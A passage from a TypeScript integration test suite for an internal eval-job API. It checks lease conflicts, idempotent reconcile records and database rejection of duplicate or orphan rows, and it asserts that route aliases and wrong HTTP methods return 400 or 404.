    expect(concurrent.map((response) => response.status)).toEqual([200, 200]);
    for (const response of concurrent) {
      const job = (responseData(response.json).jobs as unknown[]).map(record)
        .find((candidate) => candidate.eval_job_id === evalJobId)!;
      expect(job.reconciliation_state).toBe("required");
    }
    let count = await harness.client.query(
      `SELECT
         (SELECT count(*)::int FROM evolution_eval_reconcile_fact WHERE eval_job_id=$1) AS facts,
         (SELECT count(*)::int FROM evolution_eval_audit_event
           WHERE eval_job_id=$1 AND event_type='reconcile_required') AS audits,
         (SELECT count(*)::int FROM outbox_events
           WHERE aggregate_id=$1 AND event_type='evolution_eval.reconcile_requested') AS outbox`,
      [evalJobId],
    );
    expect(count.rows[0]).toMatchObject({ facts: 1, audits: 1, outbox: 1 });

    await harness.client.query(
      "UPDATE curator_run SET lease_expires_at=now()-interval '1 second' WHERE id=$1",
      [firstClaim.runId],
    );
    const secondReclaim = await claimFixture(firstClaim);
    expect(secondReclaim.leaseToken).not.toBe(reclaimed.leaseToken);
    const staleRecover = await apiCall(harness.baseUrl, recoverPath, {
      method: "POST",
      token: evaluatorToken,
      body: recoverBody,
    });
    expect(staleRecover.status).toBe(409);
    expect(responseError(staleRecover.json).code).toBe("EVOLUTION_LEASE_CONFLICT");
    const newRecover = await apiCall(harness.baseUrl, recoverPath, {
      method: "POST",
      token: evaluatorToken,
      body: { ...recoverBody, curator_lease_token: secondReclaim.leaseToken },
    });
    expect(newRecover.status).toBe(200);
    count = await harness.client.query(
      `SELECT
         (SELECT count(*)::int FROM evolution_eval_reconcile_fact WHERE eval_job_id=$1) AS facts,
         (SELECT count(*)::int FROM evolution_eval_audit_event
           WHERE eval_job_id=$1 AND event_type='reconcile_required') AS audits,
         (SELECT count(*)::int FROM outbox_events
           WHERE aggregate_id=$1 AND event_type='evolution_eval.reconcile_requested') AS outbox`,
      [evalJobId],
    );
    expect(count.rows[0]).toMatchObject({ facts: 1, audits: 1, outbox: 1 });
    expect(connectorCalls).toBe(0);

    const duplicateFact = harness.client.query(
      `INSERT INTO evolution_eval_reconcile_fact
        (id,eval_job_id,reconciliation_sequence,reconcile_request_hash,
         workspace_id,workspace_revision,workspace_manifest_hash,audit_event_id,outbox_event_id)
       VALUES ($1,$2,2,$3,$4,$5,$6,$7,$8)`,
      [
        `reconcile_duplicate_${randomUUID()}`,
        evalJobId,
        hash(`duplicate-reconcile:${evalJobId}`),
        fact.workspace_id,
        fact.workspace_revision,
        fact.workspace_manifest_hash,
        `audit_missing_${randomUUID()}`,
        randomUUID(),
      ],
    );
    await expect(duplicateFact).rejects.toThrow();

    const orphanAudit = harness.client.query(
      `INSERT INTO evolution_eval_audit_event
        (id,curator_run_id,eval_job_id,project_id,event_type,actor_type,actor_id,
         correlation_id,request_hash,operation,workspace_manifest_hash,file_count,byte_count)
       VALUES ($1,$2,$3,$4,'reconcile_required','service',$5,$6,$7,$8,$9,$10,$11)`,
      [
        `audit_orphan_${randomUUID()}`,
        firstClaim.runId,
        evalJobId,
        fact.project_id,
        harness.ids.serviceUid,
        fact.correlation_id,
        hash(`orphan-audit:${evalJobId}`),
        fact.operation,
        fact.workspace_manifest_hash,
        fact.file_count,
        fact.byte_count,
      ],
    );
    await expect(orphanAudit).rejects.toThrow();

    const sequence = await harness.client.query(
      `SELECT COALESCE(max(sequence),0)::int + 1 AS next
         FROM outbox_events
        WHERE aggregate_type='evolution_eval_job' AND aggregate_id=$1`,
      [evalJobId],
    );
    const orphanOutbox = harness.client.query(
      `INSERT INTO outbox_events
        (event_id,aggregate_type,aggregate_id,sequence,event_type,project_id,payload,
         correlation_id,classification)
       VALUES ($1,'evolution_eval_job',$2,$3,'evolution_eval.reconcile_requested',$4,
               $5::jsonb,$6,'D1')`,
      [
        randomUUID(),
        evalJobId,
        sequence.rows[0]!.next,
        fact.project_id,
        JSON.stringify({ fact_id: `missing_${randomUUID()}` }),
        fact.correlation_id,
      ],
    );
    await expect(orphanOutbox).rejects.toThrow();
    const afterAdversarial = await harness.client.query(
      `SELECT
         (SELECT count(*)::int FROM evolution_eval_reconcile_fact WHERE eval_job_id=$1) AS facts,
         (SELECT count(*)::int FROM evolution_eval_audit_event
           WHERE eval_job_id=$1 AND event_type='reconcile_required') AS audits,
         (SELECT count(*)::int FROM outbox_events
           WHERE aggregate_id=$1 AND event_type='evolution_eval.reconcile_requested') AS outbox`,
      [evalJobId],
    );
    expect(afterAdversarial.rows[0]).toMatchObject({ facts: 1, audits: 1, outbox: 1 });
  });

  test("eval route aliases, query-string content and wrong HTTP methods remain nonexistent", async () => {
    const claim = await claimFixture(await seedClaimable("aliases"));
    const preparedResponse = await prepare(claim, "alias-prepare");
    expect(preparedResponse.status).toBe(201);
    const prepared = responseData(preparedResponse.json);
    const evalJobId = String(prepared.eval_job_id);
    const workspaceId = String(prepared.workspace_id);
    const preparePath = `/api/v1/internal/evolution/curator-runs/${claim.runId}/eval-jobs/prepare`;
    const jobPath = `/api/v1/internal/evolution/curator-runs/${claim.runId}/eval-jobs/${evalJobId}`;
    const requests = [
      apiCall(harness.baseUrl, `${preparePath}?project_id=${claim.projectId}`, {
        method: "POST",
        token: evaluatorToken,
        headers: { "idempotency-key": "query-alias" },
        body: prepareBody(claim),
      }),
      apiCall(harness.baseUrl, preparePath, { method: "GET", token: evaluatorToken }),
      apiCall(harness.baseUrl, `${jobPath}/workspace/read`, { method: "GET", token: evaluatorToken }),
      apiCall(harness.baseUrl, `${jobPath}/workspace/write`, {
        method: "PUT",
        token: evaluatorToken,
        body: {
          schema: "evolution-eval-workspace-write.v1",
          curator_lease_token: claim.leaseToken,
          workspace_id: workspaceId,
          expected_workspace_revision: 1,
          changes: [],
        },
      }),
      apiCall(
        harness.baseUrl,
        `/api/v1/internal/evolution/curator-runs/${claim.runId}/eval-jobs/recover`,
        { method: "GET", token: evaluatorToken },
      ),
      apiCall(harness.baseUrl, `${jobPath}/workspace?path=${encodeURIComponent(claim.sourcePath)}`, {
        method: "GET",
        token: evaluatorToken,
      }),
    ];
    const responses = await Promise.all(requests);
    expect(responses.map((response) => response.status)).toEqual([400, 404, 404, 404, 404, 404]);
    expect(responseError(responses[0]!.json).code).toBe("EVOLUTION_EVAL_INVALID_REQUEST");
  });
});
